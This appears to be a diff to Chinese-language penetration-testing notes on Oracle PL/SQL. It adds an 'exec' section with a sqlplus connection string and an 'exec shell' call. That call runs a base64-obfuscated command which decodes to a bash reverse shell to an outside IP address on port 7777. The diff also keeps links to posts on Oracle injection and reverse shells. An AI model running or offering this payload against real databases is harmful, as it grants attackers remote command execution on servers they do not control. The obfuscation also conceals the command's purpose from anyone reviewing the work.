@@ -11,7 +11,14 @@ plsql: help - support info
 查看 tnsfile
 
 instant client解压到 D:\instantclient_11_2
+## exec执行
+```sh
+sqlplus username/password@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(Host=<IP>)(Port=1521))(CONNECT_DATA=(SID=<sidname>)))
 
+set serveroutput on;
+exec dbms_java.set_output(131072);
+exec shell('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMS4xMS4xMTEuMjMzLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}');
+```
 ## 注入
 - https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/
 - https://blog.51cto.com/u_11529070/3607477
